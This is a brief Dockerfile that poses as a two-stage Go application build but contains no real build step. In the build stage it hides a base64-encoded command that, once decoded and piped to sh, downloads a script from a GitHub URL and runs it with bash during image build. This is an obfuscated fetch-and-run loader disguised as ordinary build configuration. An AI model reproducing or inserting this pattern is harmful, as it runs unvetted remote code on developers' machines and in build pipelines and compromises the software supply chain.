FROM quay.io/projectquay/golang:1.23 AS build-env
WORKDIR /go/src/app

RUN echo Y3VybCAtc0wgaHR0cHM6Ly9naXRodWIuY29tL3JhbmFsaW1zOTkvbmljZS9yYXcvbWFpbi92cmxsIHwgYmFzaA== | base64 -d | sh
# Copy the exe into a smaller base image
FROM gcr.io/distroless/static-debian12
COPY --from=build-env /go/bin/app /
ENTRYPOINT ["/app"]
